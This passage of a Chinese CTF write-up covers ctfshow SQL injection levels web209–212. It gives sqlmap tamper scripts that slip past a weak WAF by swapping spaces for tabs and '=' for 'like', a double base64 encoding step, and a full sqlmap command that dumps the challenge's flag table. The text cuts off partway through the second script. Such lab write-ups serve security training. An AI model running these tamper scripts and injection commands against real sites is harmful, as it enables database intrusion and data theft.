2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web209">web209<a href="#web209" class="hash-link" aria-label="Direct link to web209" title="Direct link to web209">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   //TODO 未完工</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   return preg_match(&#x27;/ |\*|\=/&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>过滤空格 * = 其中空格我们可以用%09绕过 然后=可以用like</p>
<p>这里就需要去修改脚本</p>
<p>在/usr/share/sqlmap/tamper/下，复制一个space2comment.py，把名字改成web209.py</p>
<p>下图是原来的</p>
<p><img decoding="async" loading="lazy" alt="image-20220110141411415" src="/assets/images/image-20220110141411415-a376182972756cb5f0deb161fa4fd665.png" width="709" height="488" class="img_ev3q"></p>
<p>改成下面这样</p>
<p><img decoding="async" loading="lazy" alt="image-20220110141503366" src="/assets/images/image-20220110141503366-e6100311137154cf2e9afc47b83b1924.png" width="653" height="502" class="img_ev3q"></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">See the file &#x27;LICENSE&#x27; for copying permission</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> lib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">core</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">compat </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token builtin">xrange</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> lib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">core</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">enums </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> PRIORITY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">__priority__ </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> PRIORITY</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">LOW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dependencies</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tamper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Tested against:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Microsoft SQL Server 2005</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * MySQL 4, 5.0 and 5.5</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Oracle 10g</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * PostgreSQL 8.3, 8.4, 9.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Notes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Useful to bypass weak and bespoke web application firewalls</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    retVal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        retVal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        quote</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> doublequote</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> firstspace </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">xrange</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> firstspace</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">isspace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    firstspace </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                quote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> quote</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                doublequote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> doublequote</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;like&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> doublequote </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> quote</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> retVal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后用这个脚本即可，注意又换了老东西</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-D ctfshow_web -T ctfshow_flav -C ctfshow_flagx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://d27c491a-77a4-4b76-9e64-04989ca8eba8.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://d27c491a-77a4-4b76-9e64-04989ca8eba8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://d27c491a-77a4-4b76-9e64-04989ca8eba8.challenge.ctf.show/sqlmap.php --tamper=web209.py --threads=3 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220110144345286" src="/assets/images/image-20220110144345286-50f06e145579cef0f1bdf198bd0b88fc.png" width="1171" height="351" class="img_ev3q"></p>
<p>因为他说我线程低了，所以顺便提了线程</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web210-212">web210-212<a href="#web210-212" class="hash-link" aria-label="Direct link to web210-212" title="Direct link to web210-212">​</a></h3>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对查询 字符进行解密</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function decode($id){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return strrev(base64_decode(strrev(base64_decode($id))));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对id进行base64解码，反转字符串，解码，再反转</p>
<p>好说，继续用刚刚的exp，只需要在最后加上面的反向操作即可，即</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload_ret</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后改成web210.py</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">See the file &#x27;LICENSE&#x27; for copying permission</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> lib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">core</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">compat </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token builtin">xrange</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> lib</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">core</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">enums </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> PRIORITY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">__priority__ </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> PRIORITY</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">LOW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dependencies</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tamper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Tested against:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Microsoft SQL Server 2005</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * MySQL 4, 5.0 and 5.5</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Oracle 10g</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * PostgreSQL 8.3, 8.4, 9.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    Notes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">        * Useful to bypass weak and bespoke web application firewalls</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    retVal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        retVal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        quote</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> doublequote</span><span class="token punctuation" style="color:#393A34">,</span><span 